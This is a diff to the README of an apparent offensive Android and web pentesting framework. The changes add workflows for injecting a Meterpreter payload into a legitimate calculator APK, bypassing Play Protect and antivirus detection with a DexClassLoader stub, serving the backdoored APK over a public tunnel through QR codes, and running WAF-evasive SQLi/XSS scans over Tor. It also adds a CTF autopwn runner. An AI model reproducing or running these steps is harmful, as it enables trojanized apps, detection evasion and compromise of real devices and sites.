@@ -197,9 +197,9 @@ Full-lifecycle Android pentesting suite — from passive recon to active exploit
 | `exploit_cve`      | Targeted CVE exploitation (CVE-2024-0044, CVE-2023-45866, CVE-2024-31317, etc.)  |
 | `cve_chain`        | Run predefined CVE chain: bt_to_root, sandbox_exfil, zero_click_full              |
 | `zero_click`       | Probe zero-click surfaces: Bluetooth HID, NFC, WiFi broadcast, media parsing      |
-| `qr_exploit`       | Generate QR code for APK download, Android Intent URI, ADB WiFi pairing, deeplink|
+| `qr_exploit`       | Generate QR for APK URL, Intent URI, ADB WiFi pairing, deeplink, or **wan** (bore tunnel + detached APK HTTP server, QR = real public WAN URL)|
 | `device_net_scan`  | Scan device WiFi via netrecon, detect exposed ADB TCP and web services            |
-| `wan_expose`       | Expose MSF listener and APK HTTP server via Cloudflare Tunnel for WAN delivery    |
+| `wan_expose`       | Expose MSF listener and APK HTTP server via Cloudflare Tunnel; falls back to bore if cloudflared is not installed|
 | `msf_handler`      | Launch Metasploit multi/handler and start msfrpcd for GUI session management      |
 | `full_pwn`         | 7-step chain: recon + adb_wifi + get_root + device_net_scan + shell + persist + WAN|
 | `multi_device`     | Run any operation across all connected devices simultaneously                     |
@@ -250,7 +250,114 @@ use android_pentest
 set operation app_scan
 set package com.target.app
 run device
+
+# WAN APK delivery via bore tunnel (no port-forwarding required)
+use android_pentest
+set operation qr_exploit
+set mode wan
+set apk_path /tmp/payload.apk   # optional: overrides work_dir glob
+set bore_server bore.pub        # default, can omit
+run no_device
+# Spawns detached HTTP server + bore tunnel, prints QR encoding
+# http://bore.pub:<assigned-port>/payload.apk
+
+# WAN expose with bore fallback (cloudflared → bore auto-fallback)
+use android_pentest
+set operation wan_expose
+set lport 4444
+set serve_port 8888
+run connected
 ```
+
+**bore install** (v0.5.1, required for wan mode and bore fallback):
+```bash
+curl -sL https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-unknown-linux-musl.tar.gz | tar xz -C ~/.local/bin
+```
+
+**Play Protect Bypass:**
+
+A raw `deploy_shell` APK (`com.metasploit.stage`) is flagged by every AV engine and Play Protect on install. Two bypass options:
+
+| Option | Operation | Detection | Requires |
+|--------|-----------|-----------|----------|
+| Template injection | `backdoor_apk` | Medium — preserved package name, real icon | A legitimate APK file |
+| DexClassLoader chain | `rebuild` | Low — no static Meterpreter bytecode in APK | bore tunnel for runtime DEX delivery |
+
+```bash
+# Option 1 — inject into a real APK (preserves package name + icon)
+use android_pentest
+set operation backdoor_apk
+set package com.example.calculator   # app installed on device
+# or: set apk_path /tmp/calc.apk    # skip device pull, use local file
+set lhost 161.35.110.36              # bore.pub resolved IP
+set lport 41736                      # bore MSF tunnel port
+run connected
+# Delivers: calculator_backdoored_signed.apk
+
+# Then serve via WAN QR:
+set operation qr_exploit
+set mode wan
+set apk_path /path/to/calculator_backdoored_signed.apk
+run no_device
+
+# Option 2 — DexClassLoader stub (no static payload in APK at all)
+use android_pentest
+set operation rebuild
+set apk_path /tmp/base.apk
+set bore_dex_port 21062   # bore.pub:21062 → HTTP server serving s.dex
+set bore_msf_port 37993   # bore.pub:37993 → MSF handler :4444
+run connected
+```
+
+---
+
+### `ctfpwn` — CTF Autopwn
+
+Syncs `github.com/0xb0rn3/CTFs`, lists all rooms sorted newest first, and runs standalone autopwn scripts against a target machine. Auto-detects the latest CTF, extracts flags from output (THM{}/HTB{} patterns), and saves everything to `~/ZX01C/CTF/<room>/`.
+
+| Operation | Description |
+|-----------|-------------|
+| `list`    | List all CTFs sorted newest first (auto-pulls latest) |
+| `pull`    | Clone/update repo + mirror all rooms to `~/ZX01C/CTF/` |
+| `latest`  | Show newest CTF; if target IP given, run its autopwn script |
+| `run`     | Run a specific room's autopwn script against target IP |
+| `info`    | Show README/writeup for a room |
+| `search`  | Full-text search across room names, writeups, and scripts |
+
+| Parameter  | Default | Description |
+|------------|---------|-------------|
+| `operation`| `list`  | Operation to run |
+| `ctf`      | —       | Room name (case-insensitive, partial match) |
+| `platform` | `THM`   | `THM` \| `HTB` \| `ALL` |
+| `query`    | —       | Search term for `search` operation |
+
+```bash
+# List all CTFs
+use ctfpwn
+set operation list
+run none
+
+# Run latest CTF against target
+use ctfpwn
+set operation latest
+run 10.10.85.42
+
+# Run specific room
+use ctfpwn
+set operation run
+set ctf simplectf
+run 10.10.85.42
+
+# Search by technique
+use ctfpwn
+set operation search
+set query ssti
+run none
+```
+
+**Rooms** (25 THM, HTB coming): `Biohazard`, `AttacktiveDirectory`, `UltraTech`, `Blog`, `0day`, `Dogcat`, `Ghizer`, `Relevant`, `Wgel`, `Wonderland`, `Cheese-CTF`, `Year of the pig`, `Rabbit_Store`, `Silver_Platter`, `crypto_failures`, `sticker_shop`, `chill-hack`, `W1seGuy`, `agent_sudo`, `bounty_hacker`, `Hidden_Deep_Into_My_Heart`, `VulnNet-Internal`, `pickle-rick`, `simplectf`, `rootmeCTF`
+
+**Output:** `~/ZX01C/CTF/<room>/` — includes copied scripts, README, and timestamped run log.
 
 ---
 
@@ -294,7 +401,7 @@ run 192.168.1.0/24
 
 ### `websec` — Web Offensive Tool
 
-Full-stack web attack surface tool. DNS/WHOIS/SSL OSINT, security headers, CORS, cookies, directory brute-force, error-based + time-blind SQLi, reflected XSS, CSRF, 403 bypass, open redirect, Jira/AEM/Confluence CVEs, WAF fingerprinting, web spidering, and Google dorks. Authenticated scanning via cookies/custom headers. Works with stdlib; add `requests` for active testing, `beautifulsoup4` for HTML-aware spidering.
+Full-stack web attack surface tool. DNS/WHOIS/SSL OSINT, security headers, CORS, cookies, directory brute-force, error-based + time-blind SQLi (with WAF evasion variants), reflected XSS, CSRF, 403 bypass, open redirect, Jira/AEM/Confluence CVEs, WordPress attack surface, WAF fingerprinting, web spidering, and Google dorks. Built-in stealth layer: UA rotation across 20 real browser strings, full Sec-Fetch-* browser headers, configurable delay/jitter, proxy/Tor routing. Authenticated scanning via cookies/custom headers.
 
 | Operation        | Description                                                             |
 |------------------|-------------------------------------------------------------------------|
@@ -303,9 +410,9 @@ Full-stack web attack surface tool. DNS/WHOIS/SSL OSINT, security headers, CORS,
 | `cors`           | CORS: wildcard, origin reflection, credentials misconfig                |
 | `cookies`        | Cookie flag audit: Secure, HttpOnly, SameSite                           |
 | `dirs`           | Directory brute-force with 100+ built-in paths + custom wordlist        |
-| `sqli`           | Error-based + time-blind SQLi (15+ DB patterns, MySQL/PgSQL/MSSQL)     |
-| `xss`            | Reflected XSS via input parameter reflection                            |
-| `csrf`           | CSRF token detection on all forms                                       |
+| `sqli`           | Error-based + time-blind SQLi; WAF-evasion variants via `waf_evasion`  |
+| `xss`            | Reflected XSS; WAF-evasion variants via `waf_evasion`                  |
+| `csrf`           | CSRF token detection across homepage + common form paths                |
 | `bypass_403`     | 403 bypass via header injection and path manipulation                   |
 | `open_redirect`  | Open redirect via 12+ common redirect parameter names                   |
 | `framework_cves` | Jira/AEM/Confluence CVE path probing (15+ known CVE paths)             |
@@ -315,12 +422,36 @@ Full-stack web attack surface tool. DNS/WHOIS/SSL OSINT, security headers, CORS,
 | `dork`           | Generate 18+ Google dork queries + OSINT resource links                 |
 | `ssl`            | SSL/TLS: version, cipher suites, cert details, expiry                   |
 | `waf`            | WAF fingerprinting: Cloudflare, AWS, ModSecurity, Akamai, Imperva, F5  |
+| `wordpress`      | WP attack surface: user enum (REST+author), xmlrpc, plugins, version   |
+| `stealth`        | Show stealth config, print live headers, test proxy reachability        |
 | `full`           | All checks in one pass                                                  |
 
+**Stealth parameters:**
+
+| Parameter     | Default | Description                                                   |
+|---------------|---------|---------------------------------------------------------------|
+| `stealth`     | false   | UA rotation + full browser headers on every request           |
+| `rotate_ua`   | false   | Rotate UA per request (auto-enabled with `stealth true`)      |
+| `delay`       | 0       | Fixed delay in seconds between requests                       |
+| `jitter`      | 0       | Random 0–N second offset added to each delay                  |
+| `proxy`       | —       | Proxy URL: `http://host:port` or `socks5://host:port`         |
+| `waf_evasion` | false   | Obfuscated SQLi/XSS payload variants to bypass WAF signatures |
+
 ```bash
+# SQLi with stealth + Tor + WAF evasion
 use websec
+set stealth true
+set proxy socks5://127.0.0.1:9050
+set delay 0.5
+set jitter 1.5
+set waf_evasion true
 set operation sqli
 set test_url https://example.com/search?q=test
+run https://example.com
+
+# WordPress attack surface
+use websec
+set operation wordpress
 run https://example.com
 
 # 403 bypass
